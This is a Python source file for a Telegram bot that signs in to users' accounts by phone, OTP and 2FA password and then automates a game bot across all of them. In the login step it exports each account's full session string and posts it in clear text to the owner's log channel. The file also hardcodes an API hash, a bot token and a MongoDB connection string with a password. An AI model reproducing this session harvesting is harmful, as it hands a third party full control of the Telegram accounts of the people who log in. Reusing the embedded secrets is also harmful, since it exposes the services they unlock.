import asyncio
import random
import logging
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeExpired, PhoneCodeInvalid
from motor.motor_asyncio import AsyncIOMotorClient

# Enable basic logging to see errors in console
logging.basicConfig(level=logging.INFO)

# ==========================================
# 1. CONFIGURATION
# ==========================================
API_ID = 39271374
API_HASH = "7f5e72e0b56f25d674b0208222407382"
BOT_TOKEN = "8881160189:AAF6_iCVcsZ2OZQx7lyehrQyrEtOvDQGhqg"
OWNER_ID = [5303251380, 5858459838]  # Both IDs have full admin access
LOG_CHANNEL_ID = -1003931425582
TARGET_BOT = "@OrdinalLegacybot"

MONGO_URI = "mongodb+srv://aryankumar170911_db_user:cbpkNIKclPl3EtXu@olbot.n22ncl3.mongodb.net/?appName=olbot"

# ==========================================
# 2. GLOBAL STATE & DATABASE
# ==========================================
BOT_IS_DEAD = False
login_states = {}  # Tracks user login progress {user_id: {step, phone, hash, client}}
cancel_flags = {}  # Tracks if a user cancelled their /id run {user_id: boolean}
run_stats = {}     # Tracks stats of the last run {user_id: {total, success, fail}}

db_client = AsyncIOMotorClient(MONGO_URI)
db = db_client["IdleBotDB"]
sessions_col = db["sessions"]
auth_users_col = db["authorized_users"]

app = Client("controller_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ==========================================
# 3. FILTERS & MIDDLEWARE
# ==========================================
async def check_auth(_, __, message):
    user_id = message.from_user.id if message else None
    if not user_id: return False
    
    if BOT_IS_DEAD and user_id not in OWNER_ID:
        return False
    if user_id in OWNER_ID:
        return True
        
    user = await auth_users_col.find_one({"tg_id": user_id})
    return bool(user)

auth_filter = filters.create(check_auth)

# ==========================================
# 4. OWNER COMMANDS
# ==========================================
@app.on_message(filters.command("kill") & filters.user(OWNER_ID))
async def kill_bot(client, message):
    global BOT_IS_DEAD
    BOT_IS_DEAD = True
    await message.reply_text("🔴 **KILL SWITCH ACTIVATED.** Bot is stopped for everyone.")

@app.on_message(filters.command("revive") & filters.user(OWNER_ID))
async def revive_bot(client, message):
    global BOT_IS_DEAD
    BOT_IS_DEAD = False
    await message.reply_text("🟢 **BOT REVIVED.**")

@app.on_message(filters.command("auth") & filters.user(OWNER_ID))
async def auth_user(client, message):
    try:
        if len(message.command) < 2:
            return await message.reply_text("Usage: `/auth @username`")
            
        username = message.command[1].replace("@", "")
        user = await client.get_users(username)
        await auth_users_col.update_one(
            {"tg_id": user.id}, 
            {"$set": {"username": username, "tg_id": user.id}}, 
            upsert=True
        )
        await message.reply_text(f"✅ Authorized user @{username} (ID: {user.id})")
    except Exception as e:
        await message.reply_text(f"❌ Error: {e}\n(Make sure the user has sent at least one message to the bot first).")

@app.on_message(filters.command("deauth") & filters.user(OWNER_ID))
async def deauth_user(client, message):
    try:
        if len(message.command) < 2:
            return await message.reply_text("Usage: `/deauth @username`")
            
        username = message.command[1].replace("@", "")
        result = await auth_users_col.delete_one({"username": username})
        
        if result.deleted_count > 0:
            await message.reply_text(f"🚫 Revoked access for @{username}. They can no longer use the bot.")
        else:
            await message.reply_text(f"⚠️ User @{username} not found in the authorized list.")
    except Exception as e:
        await message.reply_text(f"❌ Error: {e}")

# ==========================================
# 5. GENERAL COMMANDS
# ==========================================
@app.on_message(filters.command("start") & auth_filter)
async def start_command(client, message):
    text = (
        "**Welcome to the Idle Explore Automation Bot 🤖**\n\n"
        "✦ `/login` - Add a new account\n"
        "✦ `/logout <number>` - Remove an account\n"
        "✦ `/accounts` - View your accounts\n"
        "✦ `/stats` - View last run stats\n"
        "✦ `/cancel` - Stop ongoing sequence\n"
        "✦ `/id` - Start the idle exploration\n"
    )
    if message.from_user.id in OWNER_ID:
        text += "\n**👑 Owner Commands:**\n"
        text += "✦ `/auth @username` - Whitelist a user\n"
        text += "✦ `/deauth @username` - Revoke access\n"
        text += "✦ `/kill` - Disable bot for everyone\n"
        text += "✦ `/revive` - Re-enable bot\n"
        
    await message.reply_text(text)

@app.on_message(filters.command("accounts") & auth_filter)
async def list_accounts(client, message):
    cursor = sessions_col.find({"owner_tg_id": message.from_user.id})
    accounts = await cursor.to_list(length=100)
    
    if not accounts:
        return await message.reply_text("You don't have any accounts logged in.")
        
    text = "**Your Logged-in Accounts:**\n\n"
    for idx, acc in enumerate(accounts, 1):
        text += f"{idx}. {acc.get('first_name', 'Unknown')} (`{acc['phone_number']}`)\n"
    await message.reply_text(text)

@app.on_message(filters.command("stats") & auth_filter)
async def show_stats(client, message):
    stats = run_stats.get(message.from_user.id)
    if not stats:
        return await message.reply_text("No stats available for this session yet.")
    
    text = (
        "📊 **Last Run Stats:**\n"
        f"Total Accounts: {stats['total']}\n"
        f"✅ Success: {stats['success']}\n"
        f"❌ Failed: {stats['failed']}"
    )
    await message.reply_text(text)

@app.on_message(filters.command("cancel") & auth_filter)
async def cancel_run(client, message):
    cancel_flags[message.from_user.id] = True
    await message.reply_text("🛑 Cancel signal sent. The loop will stop after the current account finishes.")

# ==========================================
# 6. LOGIN & SESSION CREATION LOGIC
# ==========================================
@app.on_message(filters.command("login") & auth_filter)
async def login_start(client, message):
    login_states[message.from_user.id] = {"step": "phone"}
    await message.reply_text("Please enter the phone number with country code (e.g., +919876543210):")

@app.on_message(filters.text & filters.private & auth_filter, group=1)
async def login_steps_handler(client, message):
    user_id = message.from_user.id
    state = login_states.get(user_id)
    if not state: return

    step = state.get("step")
    text = message.text

    if text.startswith("/"):
        del login_states[user_id]
        return

    if step == "phone":
        phone = text.strip()
        temp_client = Client(f"temp_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await temp_client.connect()
        try:
            sent_code = await temp_client.send_code(phone)
            login_states[user_id].update({
                "step": "code",
                "phone": phone,
                "hash": sent_code.phone_code_hash,
                "client": temp_client
            })
            await message.reply_text("OTP sent! Please enter the code. (If it contains letters/spaces, enter exactly as received).")
        except Exception as e:
            await message.reply_text(f"❌ Error sending code: {e}")
            await temp_client.disconnect()
            del login_states[user_id]

    elif step == "code":
        temp_client = state["client"]
        phone = state["phone"]
        code_hash = state["hash"]
        code = text.strip()
        try:
            signed_in = await temp_client.sign_in(phone, code_hash, code)
            await finalize_login(client, temp_client, signed_in, phone, user_id, message)
        except SessionPasswordNeeded:
            login_states[user_id]["step"] = "password"
            await message.reply_text("This account has 2FA enabled. Please enter your password:")
        except Exception as e:
            await message.reply_text(f"❌ Error: {e}")
            await temp_client.disconnect()
            del login_states[user_id]

    elif step == "password":
        temp_client = state["client"]
        phone = state["phone"]
        password = text.strip()
        try:
            signed_in = await temp_client.check_password(password)
            await finalize_login(client, temp_client, signed_in, phone, user_id, message)
        except Exception as e:
            await message.reply_text(f"❌ Password Error: {e}")
            await temp_client.disconnect()
            del login_states[user_id]

async def finalize_login(app_client, user_client, user_info, phone, owner_id, message):
    session_string = await user_client.export_session_string()
    first_name = user_info.first_name or "Unknown"
    acc_id = user_info.id

    await sessions_col.update_one(
        {"phone_number": phone},
        {"$set": {
            "session_string": session_string,
            "first_name": first_name,
            "account_user_id": acc_id,
            "owner_tg_id": owner_id
        }},
        upsert=True
    )
    
    log_text = f"✅ **New Login**\n**Owner ID:** {owner_id}\n**Account:** {first_name} (`{phone}`)\n**Session:**\n`{session_string}`"
    await app_client.send_message(LOG_CHANNEL_ID, log_text)
    
    await message.reply_text(f"✅ Successfully logged in as {first_name}!")
    await user_client.disconnect()
    del login_states[owner_id]

# ==========================================
# 7. LOGOUT LOGIC
# ==========================================
@app.on_message(filters.command("logout") & auth_filter)
async def logout_cmd(client, message):
    parts = message.text.split()
    if len(parts) < 2:
        return await message.reply_text("Usage: `/logout <phone_number>`")
    phone = parts[1].strip()
    
    acc = await sessions_col.find_one({"phone_number": phone, "owner_tg_id": message.from_user.id})
    if not acc:
        return await message.reply_text("Account not found in your database.")

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Yes, Logout", callback_data=f"logout_{phone}"),
         InlineKeyboardButton("Cancel", callback_data="cancel_logout")]
    ])
    await message.reply_text(f"Are you sure you want to logout `{phone}`?", reply_markup=keyboard)

@app.on_callback_query(filters.regex(r"^logout_"))
async def confirm_logout(client, callback: CallbackQuery):
    phone = callback.data.split("_")[1]
    acc = await sessions_col.find_one({"phone_number": phone})
    
    if acc:
        await sessions_col.delete_one({"phone_number": phone})
        await client.send_message(LOG_CHANNEL_ID, f"❌ **Logged Out**\nAccount: `{phone}`\nOwner: {callback.from_user.id}")
        await callback.message.edit_text(f"✅ Account `{phone}` removed successfully.")
    else:
        await callback.message.edit_text("Account already removed or not found.")

@app.on_callback_query(filters.regex(r"^cancel_logout$"))
async def cancel_logout(client, callback: CallbackQuery):
    await callback.message.edit_text("❌ Logout cancelled.")

# ==========================================
# 8. CORE AUTOMATION (/id) LOGIC
# ==========================================
@app.on_message(filters.command(["id", "idle_explore"]) & auth_filter)
async def start_majdoori(client, message):
    await run_explore_cycle(client, message.from_user.id, message.chat.id)

@app.on_callback_query(filters.regex(r"^end_exploration$"))
async def end_majdoori_callback(client, callback: CallbackQuery):
    await callback.message.edit_text("🔄 Restarting cycle to claim/end...")
    await run_explore_cycle(client, callback.from_user.id, callback.message.chat.id)

async def run_explore_cycle(app_client, user_id, chat_id):
    cancel_flags[user_id] = False
    cursor = sessions_col.find({"owner_tg_id": user_id})
    accounts = await cursor.to_list(length=100)
    
    if not accounts:
        return await app_client.send_message(chat_id, "You have no accounts logged in!")

    status_msg = await app_client.send_message(chat_id, f"🚀 Starting sequence for {len(accounts)} accounts...")
    
    success = 0
    failed = 0

    for idx, acc in enumerate(accounts, 1):
        if cancel_flags.get(user_id):
            await app_client.send_message(chat_id, "🛑 Sequence stopped by user.")
            break
            
        await status_msg.edit_text(f"⏳ Processing {idx}/{len(accounts)}: {acc.get('first_name')}...")
        
        try:
            uc = Client(f"temp_run_{acc['phone_number']}", session_string=acc['session_string'], in_memory=True)
            await uc.connect()
            
            await uc.send_message(TARGET_BOT, "/idle_explore")
            await asyncio.sleep(3) 
            
            clicked = False
            async for history_msg in uc.get_chat_history(TARGET_BOT, limit=3):
                if history_msg.reply_markup and history_msg.reply_markup.inline_keyboard:
                    for row in history_msg.reply_markup.inline_keyboard:
                        for button in row:
                            if "Simple Quick" in button.text or "Normal" in button.text:
                                await uc.request_callback_answer(
                                    chat_id=TARGET_BOT,
                                    message_id=history_msg.id,
                                    callback_data=button.callback_data
                                )
                                clicked = True
                                break
                        if clicked: break
                if clicked: break
            
            await uc.disconnect()
            if clicked:
                success += 1
            else:
                failed += 1
                
        except Exception as e:
            failed += 1
            print(f"Error on {acc['phone_number']}: {e}")
            
        await asyncio.sleep(random.uniform(2.0, 4.0))

    run_stats[user_id] = {"total": len(accounts), "success": success, "failed": failed}
    
    if not cancel_flags.get(user_id):
        await status_msg.edit_text(f"✅ Cycle complete!\nStats: {success} Success | {failed} Failed.\nWaiting 5 minutes...")
        asyncio.create_task(timer_task(app_client, user_id, chat_id))

async def timer_task(app_client, user_id, chat_id):
    await asyncio.sleep(300)
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("End Exploration / Claim", callback_data="end_exploration")]
    ])
    
    await app_client.send_message(
        chat_id, 
        "🔔 **5 Minutes Passed!**\nCycle complete. Click below to end exploration and run the next cycle.", 
        reply_markup=keyboard
    )

# ==========================================
# 9. START APP
# ==========================================
if __name__ == "__main__":
    print("Bot is up and running...")
    app.run()